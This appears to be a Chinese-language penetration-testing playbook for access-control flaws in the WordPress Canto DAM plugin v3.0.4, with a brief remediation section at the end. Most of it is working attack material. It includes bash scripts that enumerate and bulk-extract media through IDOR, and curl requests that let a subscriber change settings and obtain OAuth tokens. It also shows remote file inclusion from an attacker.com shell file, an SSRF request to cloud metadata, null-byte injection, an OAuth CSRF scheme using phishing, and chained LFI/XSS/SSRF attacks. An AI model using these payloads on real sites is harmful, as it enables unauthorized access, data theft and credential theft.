# WordPress Canto 插件访问控制攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

WordPress Canto DAM 插件 v3.0.4 存在严重的访问控制缺陷，导致未授权访问、水平权限提升和垂直权限提升攻击。主要问题包括：
- **认证绕过**：6 个 PHP 库文件通过用户可控的 `wp_abspath` 参数引导 WordPress，可绕过认证
- **IDOR 漏洞**：对象 ID 参数（`id`, `album`, `fbc_id`, `post_id`）无所有权验证
- **垂直权限提升**：AJAX 端点缺少 `current_user_can()` 能力检查
- **OAuth CSRF**：缺少 state 参数验证

### 1.2 受影响组件

| 文件/端点 | 漏洞类型 | 危险参数 | 影响 |
|----------|---------|---------|------|
| `get.php` | 认证绕过 + IDOR | `wp_abspath`, `album`, `id` | 未授权访问 Canto 媒体 |
| `download.php` | 认证绕过 + IDOR | `wp_abspath`, `id` | 未授权下载媒体 |
| `detail.php` | 认证绕过 + IDOR | `wp_abspath`, `id` | 未授权获取详情 |
| `tree.php` | 认证绕过 + IDOR | `wp_abspath`, `ablumid` | 未授权浏览目录树 |
| `copy-media.php` | IDOR | `fbc_id`, `post_id` | 未授权复制媒体到任意文章 |
| `admin-ajax.php?action=updateOptions` | 垂直权限提升 | `duplicates`, `cron`, `schedule` | 低权限用户修改管理员设置 |

---

## 2. 攻击场景

### 2.1 水平权限提升（IDOR）

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **媒体访问** | GET /wp-content/plugins/canto/includes/lib/get.php?id={id} | 任意用户可访问任何 Canto 媒体 |
| **媒体下载** | GET /wp-content/plugins/canto/includes/lib/download.php?id={id} | 任意用户可下载任何媒体 |
| **媒体详情** | GET /wp-content/plugins/canto/includes/lib/detail.php?id={id} | 任意用户获取任何媒体详情 |
| **目录浏览** | GET /wp-content/plugins/canto/includes/lib/tree.php?ablumid={id} | 任意用户浏览任何媒体目录 |

### 2.2 垂直权限提升

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **插件设置修改** | POST /wp-admin/admin-ajax.php?action=updateOptions | 订阅者可修改管理员设置 |
| **OAuth Token 获取** | POST /wp-admin/admin-ajax.php?action=fbc_get_token | 订阅者可获取 OAuth token |
| **媒体复制** | POST /wp-content/plugins/canto/includes/lib/copy-media.php | 订阅者可复制媒体到管理员文章 |

### 2.3 认证绕过

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **空路径绕过** | `wp_abspath=` | 跳过 WordPress 引导 |
| **无效路径绕过** | `wp_abspath=/nonexistent` | require_once 失败但后续代码执行 |
| **远程包含绕过** | `wp_abspath=http://attacker.com/` | 包含远程恶意文件 |

---

## 3. 漏洞探测方法

### 3.1 IDOR 探测

#### 3.1.1 对象 ID 枚举

```bash
#!/bin/bash
# IDOR 枚举脚本

TARGET="http://localhost:35995/wp-content/plugins/canto/includes/lib"
COOKIE="wordpress_logged_in_...=..."

# 枚举媒体 ID
for id in {1..100}; do
    response=$(curl -s -b "$COOKIE" \
        "$TARGET/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&id=$id&token=x")
    
    if [[ "$response" != *"error"* ]] && [[ -n "$response" ]]; then
        echo "Media ID $id: EXISTS"
        echo "$response" | jq '.results[] | {id, name, owner}'
    fi
done
```

#### 3.1.2 所有权检查测试

```bash
# 测试 1：访问自己的资源（应该有响应）
curl -b "$COOKIE" \
    "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&album=MY_ALBUM_ID&token=x"

# 测试 2：访问他人资源（应该被拒绝，但实际成功）
curl -b "$COOKIE" \
    "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&album=OTHER_USER_ALBUM_ID&token=x"

# 如果两个请求都返回数据，说明存在 IDOR
```

### 3.2 垂直权限提升探测

#### 3.2.1 能力检查测试

```bash
# 使用低权限用户（Subscriber）Cookie
SUBSCRIBER_COOKIE="wordpress_logged_in_...=SUBSCRIBER_SESSION"

# 尝试修改管理员设置
curl -X POST "http://localhost:35995/wp-admin/admin-ajax.php" \
    -b "$SUBSCRIBER_COOKIE" \
    -d "action=updateOptions&duplicates=1&cron=1&schedule=hourly"

# 如果返回成功，说明缺少能力检查
# 验证设置已修改：
curl -b "$ADMIN_COOKIE" \
    "http://localhost:35995/wp-admin/options-general.php?page=canto_settings" \
    | grep -E "(duplicates|cron|schedule)"
```

### 3.3 认证绕过探测

#### 3.3.1 空路径测试

```bash
# 测试空 wp_abspath
curl -i "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=&subdomain=test&app_api=example.com&token=x"

# 响应分析：
# - 如果返回 500 错误：WordPress 未加载，但可能后续代码执行
# - 如果返回 302 重定向到登录页：认证有效
# - 如果返回正常响应：认证绕过成功
```

#### 3.3.2 无效路径测试

```bash
# 测试无效路径
curl -i "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/nonexistent/path&subdomain=test&app_api=example.com&token=x"

# 分析错误消息判断 WordPress 是否加载
```

---

## 4. 漏洞利用方法

### 4.1 水平权限提升（IDOR）

#### 4.1.1 批量枚举媒体资源

```bash
#!/bin/bash
# 批量 IDOR 利用脚本

TARGET="http://localhost:35995/wp-content/plugins/canto/includes/lib"
COOKIE="wordpress_logged_in_...=..."
OUTPUT_FILE="exfiltrated_media.json"

echo "[]" > $OUTPUT_FILE

for id in {1..1000}; do
    response=$(curl -s -b "$COOKIE" \
        "$TARGET/detail.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&scheme=image&id=$id&token=x")
    
    if [[ "$response" != *"error"* ]] && [[ -n "$response" ]]; then
        echo "Found media ID: $id"
        # 追加到输出文件
        jq --argjson new "$response" '. += [$new]' $OUTPUT_FILE > tmp.json && mv tmp.json $OUTPUT_FILE
    fi
done

echo "Exfiltration complete. Results saved to $OUTPUT_FILE"
```

#### 4.1.2 未授权下载媒体

```bash
# 下载任意媒体文件
curl -b "$COOKIE" \
    "http://localhost:35995/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&id=TARGET_MEDIA_ID&token=x" \
    -o downloaded_file.jpg
```

### 4.2 垂直权限提升

#### 4.2.1 订阅者修改管理员设置

```bash
# 使用订阅者 Cookie 修改插件设置
curl -X POST "http://localhost:35995/wp-admin/admin-ajax.php" \
    -b "wordpress_logged_in_subscriber=..." \
    -d "action=updateOptions&duplicates=1&cron=1&schedule=hourly&cron_time_day=1&cron_time_hour=0"

# 验证设置已修改
curl -b "wordpress_logged_in_admin=..." \
    "http://localhost:35995/wp-admin/options-general.php?page=canto_settings" \
    | grep -E "option-value"
```

#### 4.2.2 低权限用户获取 OAuth Token

```bash
# 订阅者调用 fbc_get_token（应该仅限管理员）
curl -X POST "http://localhost:35995/wp-admin/admin-ajax.php" \
    -b "wordpress_logged_in_subscriber=..." \
    -d "action=fbc_get_token"

# 返回 OAuth token，订阅者本不应访问
```

### 4.3 认证绕过

#### 4.3.1 空字节注入绕过

```bash
# PHP < 5.3.4 支持%00 截断
curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html%00&subdomain=test&app_api=example.com&token=x"

# 实际执行：require_once("/var/www/html")
```

#### 4.3.2 远程文件包含绕过认证

```bash
# 如果 allow_url_include=On
curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=http://attacker.com/shell.txt?&subdomain=x&app_api=y&token=z"

# 攻击者服务器上的 shell.txt：
<?php
// 绕过认证检查
if (!function_exists('is_user_logged_in')) {
    function is_user_logged_in() { return true; }
}
// 执行恶意操作
?>
```

### 4.4 OAuth CSRF 攻击

#### 4.4.1 构造恶意 OAuth 回调

```bash
# 攻击者获取自己的 OAuth token 后，构造恶意回调
MALICIOUS_URL="http://localhost:35995/wp-admin/options-general.php?page=canto_settings&token=ATTACKER_TOKEN&refreshToken=ATTACKER_REFRESH&domain=attacker.canto.com&app_api=canto.com"

# 诱骗管理员访问
# 方法 1：钓鱼邮件
# 方法 2：XSS 注入
# 方法 3：社会工程学

# 管理员访问后，WordPress 存储攻击者的 OAuth token
# 攻击者现在可以监控受害者的媒体操作
```

---

## 5. 绕过方法

### 5.1 绕过所有权检查

由于 Canto 插件完全缺少所有权检查，无需绕过。

### 5.2 绕过能力检查

由于 Canto 插件 AJAX 端点缺少 `current_user_can()` 检查，无需绕过。

### 5.3 绕过认证

#### 5.3.1 利用 WordPress 引导失败

```bash
# 如果 wp_abspath 指向无效路径，require_once 失败
# 但 PHP 继续执行后续代码

curl "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/nonexistent&subdomain=169.254.169&app_api=.254/latest/meta-data&token=x"

# SSRF 请求仍然执行，因为认证代码未运行
```

#### 5.3.2 利用认证 Cookie 窃取

```bash
# 如果存在 XSS，窃取管理员 Cookie
# 然后使用窃取的 Cookie 进行授权访问

curl -b "wordpress_logged_in_admin=STOLEN_COOKIE" \
    "http://localhost:35995/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html&subdomain=test&app_api=example.com&album=SECRET_ALBUM&token=x"
```

---

## 6. 渗透测试决策流程

```
开始访问控制测试
    │
    ▼
识别访问控制机制
    │
    ├── WordPress 能力检查
    ├── 对象所有权验证
    └── 认证检查
    │
    ▼
测试认证绕过
    │
    ├── 空路径测试
    ├── 无效路径测试
    └── 远程包含测试
    │
    ▼
测试 IDOR
    │
    ├── 枚举对象 ID
    ├── 测试所有权检查
    └── 批量数据提取
    │
    ▼
测试垂直权限提升
    │
    ├── 低权限用户测试
    ├── 能力检查验证
    └── 管理员功能访问
    │
    ▼
测试 OAuth 流程
    │
    ├── State 验证
    ├── 回调验证
    └── Token 验证
    │
    ▼
深度利用
    │
    ├── 数据泄露
    ├── 配置篡改
    └── 持久化访问
```

---

## 7. 常用 Payload 速查表

| 类别 | 目标/环境 | Payload 示例 | 说明 |
|-----|---------|------------|------|
| **IDOR** | 媒体枚举 | `id={1-1000}` | 批量枚举媒体 ID |
| **IDOR** | 专辑访问 | `album=OTHER_USER_ALBUM` | 访问他人专辑 |
| **IDOR** | 目录浏览 | `ablumid=SECRET_TREE_ID` | 浏览他人目录树 |
| **垂直提升** | 修改设置 | `action=updateOptions&duplicates=1` | 订阅者修改设置 |
| **垂直提升** | OAuth Token | `action=fbc_get_token` | 低权限获取 token |
| **认证绕过** | 空路径 | `wp_abspath=` | 跳过 WordPress 引导 |
| **认证绕过** | 无效路径 | `wp_abspath=/nonexistent` | 认证代码不执行 |
| **OAuth CSRF** | 恶意回调 | `?token=ATTACKER&domain=evil.canto.com` | 劫持 OAuth |

---

## 8. WordPress 特定场景

### 8.1 结合 LFI 攻击

```
1. 通过 LFI 读取 wp-config.php 获取数据库凭证
2. 连接数据库查询所有用户会话 token
3. 使用管理员 token 访问 Canto 插件
4. 批量导出所有媒体资源
```

### 8.2 结合 XSS 攻击

```
1. 通过 XSS 注入恶意 JavaScript
2. JavaScript 调用 Canto AJAX 端点
3. 以当前用户权限执行操作
4. 如果是管理员，窃取 OAuth token
```

### 8.3 结合 SSRF 攻击

```
1. 通过 SSRF 访问云元数据获取 IAM 凭证
2. 使用凭证访问云存储中的 WordPress 备份
3. 提取数据库凭证
4. 使用凭证登录 WordPress 后台
5. 利用 IDOR 访问所有媒体
```

---

## 9. 防御建议

### 9.1 代码层修复

```php
// 添加认证检查
if (!is_user_logged_in()) {
    wp_die('Authentication required', 'Unauthorized', array('response' => 401));
}

// 添加能力检查
if (!current_user_can('manage_options')) {
    wp_die('Insufficient permissions', 'Forbidden', array('response' => 403));
}

// 添加所有权验证
$media_id = intval($_REQUEST['id']);
$user_id = get_current_user_id();

// 检查媒体是否属于当前用户
$owner_id = get_post_field('post_author', $media_id);
if ($owner_id !== $user_id) {
    wp_die('Access denied', 'Forbidden', array('response' => 403));
}

// 验证 OAuth State
$state = bin2hex(random_bytes(32));
update_option('fbc_oauth_state_' . $user_id, $state);

// 回调时验证
$expected_state = get_option('fbc_oauth_state_' . $user_id);
if (!hash_equals($expected_state, $_REQUEST['state'])) {
    wp_die('Invalid OAuth state');
}
```

### 9.2 配置层修复

```apache
# 禁止直接访问插件库文件
<FilesMatch "^(get|download|detail|tree|sizes|copy-media)\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
```

---

**文档版本：** 1.0  
**最后更新：** 2025-10-29  
**适用目标：** WordPress 6.5.4 + Canto DAM 插件 v3.0.4  
**关联漏洞：** AUTHZ-VULN-01 至 AUTHZ-VULN-12
